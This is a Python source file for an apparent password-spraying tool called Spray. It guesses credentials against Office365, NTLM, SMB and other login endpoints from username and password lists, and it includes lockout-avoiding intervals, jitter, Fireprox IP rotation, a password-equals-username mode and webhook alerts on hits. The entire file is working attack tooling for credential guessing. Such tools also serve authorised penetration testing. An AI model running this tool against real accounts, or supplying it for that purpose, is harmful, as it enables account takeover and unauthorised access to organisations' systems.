#!/usr/bin/env python3

import time
import datetime
import json
import os
import sys
import csv
from targets import *
import logging
import analyze
import requests
import warnings
import random
from time import sleep
import click 
import click_config_file
from rich.console import Console
from rich.table import Table
from rich.theme import Theme
from rich import print
from rich.prompt import Confirm
from rich.progress import Progress

VERSION = 1.0

# Defining theme
custom_theme = Theme(
    {
        "info": "blue",
        "good": "bold bright_green",
        "warning": "bold yellow",
        "danger": "bold bright_red",
    }
)

console = Console(theme=custom_theme)

def args(passlist, userlist, host, module, path, csvfile, attempts, interval, equal, timeout, port, fireprox, domain, analyze_results, jitter, jitter_min, notify, webhook, pause):

    # if any other module than Office365 is specified, make sure hostname was provided
    if module.lower() != 'office365' and not host:
        console.print(
            "[!] Hostname (-H) of target (mail.targetdomain.com) is required for all modules execept Office365",
            style="danger",
        )
        exit()

    elif module.lower() == 'office365' and not host:
        host = "Office365" # set host to Office365 for the logfile name
    elif module.lower() == 'smb' and (timeout != 5 or fireprox or port != 443):
        console.print(
            "[!] Fireprox (-f), port (-b) and timeout (-t) are incompatible when spraying over SMB",
            style="warning",
        )

    # get usernames from file
    try:
        with open(userlist, 'r') as f:
            users = f.read().splitlines()
    except Exception:
        console.print(
            f"[!] Error reading usernames from file: {userlist}", style="danger"
        )
        exit()

    # get passwords from file, otherwise treat arg as a single password to spray
    try:
        with open(passlist, 'r') as f:
            passwords = f.read().splitlines()
    except Exception:
        passwords = [passlist]

    # check that interval and attempt args are supplied together
    if interval and not attempts:
        console.print(
            "[!] Number of login attempts per interval (-a) required with -i",
            style="danger",
        )
        exit()
    elif not interval and attempts:
        console.print("[!] Minutes per interval (-i) required with -a", style="danger")
        exit()
    elif not interval and not attempts and len(passwords) > 1:
        console.print(
            "[*] You have not provided spray attempts/interval. This may lead to account lockouts!",
            style="warning",
        )
        print()

        Confirm.ask(
            "[yellow]Press enter to continue anyways",
            default=True,
            show_choices=False,
            show_default=False,
        )

    # Check that jitter flags aren't supplied independently
    if jitter_min and not jitter:
        console.print(
            "--jitter-min flag must be set with --jitter flag", style="danger"
        )
        exit()

    elif jitter and not jitter_min:
        console.print(
            "[!] --jitter flag must be set with --jitter-min flag", style="danger"
        )
        exit()

    if jitter and jitter_min and jitter_min >= jitter:
        console.print(
            "[!] --jitter flag must be greater than --jitter-min flag", style="danger"
        )
        exit()

    # Making sure user set path variable for NTLM authentication module
    if module.lower() == 'ntlm' and path is None:
        console.print(
            "[!] Must set --path to use the NTLM authentication module", style="danger"
        )
        exit()

    if notify and webhook is None:
        console.print(
            "[!] Must specify a Webhook URL when the notify flag is used.",
            style="danger",
        )
        exit()

    return users, passwords, passlist, userlist, host, module, path, csvfile, attempts, interval, equal, timeout, port, fireprox, domain, analyze_results, jitter, jitter_min, notify, webhook, pause

def check_sleep(login_attempts, attempts, interval, csvfile, analyze_results, notify, webhook, host, pause, total_hits):
    if login_attempts == attempts:
        if analyze_results:
            analyzer = analyze.Analyzer(csvfile, notify, webhook, host, total_hits)
            new_hit_total = analyzer.analyze()

            # Pausing if specified by user before continuing with spray
            if new_hit_total > total_hits and pause:
                print()
                console.print(
                    f"[+] Successful login potentially identified. Pausing...",
                    style="good",
                )
                print()
                Confirm.ask(
                    "[blue]Press enter to continue",
                    default=True,
                    show_choices=False,
                    show_default=False,
                )
                print()
        else:
            new_hit_total = 0 # just set to zero since results aren't being analyzed mid-spray
            print()
            
        console.print(
            f'[*] Sleeping until {(datetime.datetime.now() + datetime.timedelta(minutes=interval)).strftime("%m-%d %H:%M:%S")}',
            style="warning",
        )
        time.sleep(interval * 60)
        print()
        return 0, new_hit_total
    else:
        return login_attempts, total_hits



def check_file_contents(file_path, current_list):
    new_list = []
    try:
        with open(file_path, 'r') as f:
            new_list = f.read().splitlines()
    except:
        # file either no longer exists, or -p flag was given a password and not a file
        pass
    
    additions = list(set(new_list) - set(current_list))
    return additions    


def print_attempt(username, password, response, csvfile):
    if response == 'timeout':
        code = 'TIMEOUT'
        length = 'TIMEOUT'
    else:
        code = response.status_code
        length = str(len(response.content))
    print('%-27s %-17s %13s %15s' % (username, password, code, length))
    output = open(csvfile, 'a')
    output.write('%s,%s,%s,%s\n' % (username, password, code, length))
    output.close() 


def login(target, username, password, csvfile):
    try:
        response = target.login(username, password)
        target.print_response(response, csvfile)
    except requests.ConnectTimeout as e:
        target.print_response(response, csvfile, timeout=True)
    except (requests.ConnectionError, requests.ReadTimeout) as e:
        console.print("\n[!] Connection error - sleeping for 5 seconds", style="danger")
        sleep(5)
        login(target, username, password, csvfile)


def ascii():
    print(f'''

[yellow] ___  ___  ___  ___  _ _ [blue] ___  _ _  ___  ___  _    ___  ___ 
[yellow]/ __>| . \| . \| . || | |[blue]|  _>| | || . || . \| |  | __>/ __>
[yellow]\__ \|  _/|   /|   |\   /[blue]| <__|   ||   ||   /| |_ | _> \__ \\
[yellow]<___/|_|  |_\_\|_|_| |_| [blue]`___/|_|_||_|_||_\_\|___||___><___/

[yellow]                        v[blue]{VERSION}                          
''')

CONTEXT_SETTINGS = dict(help_option_names=['-h', '--help', 'help'])
@click.command(no_args_is_help=True, context_settings=CONTEXT_SETTINGS)
@click.option('-p', "--passwords", 'passlist', required=True, help="Filepath of the passwords list or a single password to spray.")
@click.option('-u', "--usernames", 'userlist', required=True, help="Filepath of the usernames list.")
@click.option('-H', "--host", required=False, type=str, help="Host to password spray (ip or hostname). Can by anything when using Office365 module - only used for logfile name.")
@click.option('-m', "--module", required=True, help="Module corresponding to target host.")
@click.option("--path", required=False, help="NTLM authentication endpoint. Ex: rpc or ews")
@click.option('-o', "--output", 'csvfile', required=False, help="Name and path of output csv where attempts will be logged.", default='output.csv')
@click.option('-a', "--attempts", required=False, type=int, help="Number of logins submissions per interval (for each user).")
@click.option('-i', "--interval", required=False, type=int, help="Minutes inbetween login intervals.")
@click.option('-e', "--equal", required=False, type=int, is_flag=True, help="Does 1 spray for each user where password = username.")
@click.option('-t', "--timeout", required=False, type=int, help="Web request timeout threshold. Default is 5 seconds.", default=5)
@click.option('-P', "--port", required=False, type=int, help="Port to connect to on the specified host. Default is 443.", default=443)
@click.option('-f', "--fireprox", required=False, type=str, help="The url of the fireprox interface, if you are using fireprox.")
@click.option('-d', "--domain", required=False, type=str, help="HTTP: Prepend DOMAIN\\ to usernames. SMB: Supply domain for smb connection.")
@click.option("--pause", 'pause', required=False, is_flag=True, default=False, type=str, help="Pause the spray following a potentially successful login")
@click.option("--analyze", 'analyze_results', default=False, is_flag=True, required=False, type=str, help="Run the results analyzer after each spray interval. False positives are more likely")
@click.option("-j", "--jitter", required=False, type=int, help="Jitter time between requests in seconds.")
@click.option("-jm", "--jitter-min", required=False, type=int, help="Minimum time between requests in seconds.")
@click.option("-n", "--notify", required=False, type=click.Choice(['teams', 'slack', 'discord']), help="Enable notifications for Slack, MS Teams or Discord.")
@click.option("-w", "--webhook", required=False, type=str, help="Webhook used for specified notification module")

# Allows user to specify configuration file with --config
@click_config_file.configuration_option()

def main(passlist, userlist, host, module, path, csvfile, attempts, interval, equal, timeout, port, fireprox, domain, analyze_results, jitter, jitter_min, notify, webhook, pause):

    """Low and slow password spraying tool..."""

    # Dealing with SSL Warnings
    try:
        import requests.packages.urllib3
        requests.packages.urllib3.disable_warnings()
    except Exception:
        pass


    # Parsing and validating command line arguments with args() function
    users, passwords, passfile, userfile, host, module, path, csvfile, attempts, interval, equal, timeout, port, fireprox, domain, analyze_results, jitter, jitter_min, notify, webhook, pause = args(passlist, userlist, host, module, path, csvfile, attempts, interval, equal, timeout, port, fireprox, domain, analyze_results, jitter, jitter_min, notify, webhook, pause)

    # Counter for potential successful logins idenitified
    total_hits = 0

    # try to instantiate the specified module
    try:
        # Passing in path for NTLM over HTTP module
        if module.title().lower() == 'ntlm':
            module = module.title()
            mod_name = getattr(sys.modules[__name__], module)
            class_name = getattr(mod_name, module)
            target = class_name(host, port, timeout, path, fireprox)
        else:
            # Else, we just pass the default arguments
            module = module.title()
            mod_name = getattr(sys.modules[__name__], module)
            class_name = getattr(mod_name, module)
            target = class_name(host, port, timeout, fireprox)
    except AttributeError:
        console.print(
            f"[!] Error loading {module} module. {module} is spelled incorrectly or does not exist",
            style="danger",
        )
        exit()

    # create the log file
    if not os.path.isdir('logs'):
        os.mkdir('logs')
    log_name = 'logs/%s.log' % host
    logging.basicConfig(filename=log_name, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

    ascii()

    spray_info = Table(
        show_header=False,
        show_footer=False,
        title=f"Module: {module.upper()}",
        title_justify="left",
        title_style="bold reverse",
    )

    spray_info.add_row("Target", f"{target.url}")

    if domain:
        spray_info.add_row("Domain", f"{domain}")

    if attempts:
        spray_info.add_row("Interval", f"{interval} minutes")
        spray_info.add_row("Attempts", f"{attempts} per interval")

    if jitter:
        spray_info.add_row("Jitter", f"{jitter_min}-{jitter} seconds")

    if notify:
        spray_info.add_row("Notify", f"True ({notify})")

    spray_info.add_row("Logfile", f"{log_name}")
    spray_info.add_row("Results", f"{csvfile}")

    console.print(spray_info)

    print()
    Confirm.ask(
        "[blue]Press enter to begin",
        default=True,
        show_choices=False,
        show_default=False,
    )
    print()

    if module == "Smb":
        console.print(f"[*] Initiaing SMB connection to {host} ...", style="warning")
        if target.get_conn():
            console.print(
                f'[+] Connected to {host} over {"SMBv1" if target.smbv1 else "SMBv3"}',
                style="good",
            )

            console.print(f"\t[>] Hostname: {target.hostname} ", style="info")
            console.print(f"\t[>] Domain: {target.domain} ", style="info")
            console.print(f"\t[>] OS: {target.os} ", style="info")
            print()

        else:
            console.print(f"[!] Failed to connect to {host} over SMB", style="danger")
            exit()

    target.print_headers(csvfile)

    login_attempts = 0

    # spray once with password = username if flag present
    if equal:
        with Progress() as progress:
            task = progress.add_task(f"Equal set...", total=len(users))
            for username in users:
                pword = username.split('@')[0]
                if jitter is not None:
                    if jitter_min is None:
                        jitter_min = 0
                    time.sleep(random.randint(jitter_min,jitter))
                login(target, username, pword, csvfile)
                progress.update(task, advance=1)
            
            # log the login attempt
            logging.info(f'Login attempted as {username}')

        login_attempts += 1

    # spray using password file
    for password in passwords:
        # trigger sleep if attempts limit hit
        login_attempts, total_hits = check_sleep(login_attempts, attempts, interval, csvfile, analyze_results, notify, webhook, host, pause, total_hits)

        # check if user/pass files have been updated and add new entries to current lists
        # this will let users add (but not remove) users/passwords into the spray as it runs
        new_users = check_file_contents(userfile, users)
        new_passwords = check_file_contents(passfile, passwords)
        
        if len(new_users) > 0:
            console.print(
                f"[>] Adding {len(new_users)} new users into the spray!", style="info"
            )
            users.extend(new_users)

        if len(new_passwords) > 0:
            console.print(
                f"[>] Adding {len(new_passwords)} new passwords to the end of the spray!",
                style="info",
            )
            passwords.extend(new_passwords)

        # print line separator
        if len(new_passwords) > 0 or len(new_users) > 0:
            print()

        with Progress() as progress:
            task = progress.add_task(f"[green]Spraying: {password}", total=len(users))
            while not progress.finished:
                for username in users:
                    if domain:
                        username = f'{domain}\\{username}'
                    if jitter is not None:
                        if jitter_min is None:
                            jitter_min = 0
                        time.sleep(random.randint(jitter_min,jitter))
                    login(target, username, password, csvfile)
                    progress.update(task, advance=1)
            
            # log the login attempt
            logging.info(f'Login attempted as {username}')
            
        login_attempts += 1
    
    # analyze the results to point out possible hits
    analyzer = analyze.Analyzer(csvfile, notify, webhook, host, total_hits)
    new_hit_total = analyzer.analyze()

    if new_hit_total > total_hits and pause:
        print()
        console.print(
            "[+] Successful login potentially identified. Pausing!",
            style="bold bright_green",
        )
        print()
        Confirm.ask(
            "[blue]Press enter to continue",
            default=True,
            show_choices=False,
            show_default=False,
        )

    

# stock boilerplate
if __name__ == '__main__':
    main()
